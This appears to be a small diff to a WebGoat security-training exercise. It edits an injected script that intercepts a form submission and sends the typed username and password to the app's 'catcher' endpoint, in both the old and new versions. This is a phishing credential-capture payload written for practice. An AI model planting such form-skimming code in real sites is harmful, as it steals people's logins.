@@ -16,8 +16,6 @@
 <script>
 	document.forms[1].addEventListener("submit", (event) => {
 		event.preventDefault();
-		const form = new FormData(event.target);
-		console.log(form);
-		fetch(`/WebGoat/catcher?PROPERTY=yes&phish-username=${form.get('username')}&phish-password=${form.get('password')}`);
+		fetch(`/WebGoat/catcher?PROPERTY=yes&phish-username=${event.target[0].value}&phish-password=${event.target[1].value}`);
 	});
 </script>
